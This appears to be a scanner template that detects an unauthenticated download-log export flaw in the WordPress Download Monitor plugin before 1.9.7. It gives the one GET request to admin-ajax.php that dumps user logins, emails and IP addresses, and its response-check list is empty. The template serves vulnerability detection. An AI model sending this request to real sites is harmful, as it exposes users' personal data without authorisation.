id: download-monitor-unauth-log-export
brief:
    title: Download Monitor < 1.9.7 - Unauthenticated Download Log Export
    by: 0x_Akoko
    level: high
    about: Detected Download Monitor plugin before 1.9.7 exposed the full download log CSV to unauthenticated users, revealing fields including User Login, User Email, User IP, and User Agent for every record...
    label:
        - wordpress
        - wp-plugin
        - download-monitor
        - unauth
        - disclosure
        - exposure
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin-ajax.php?action=test&dlm_download_logs=true'
      signs: []
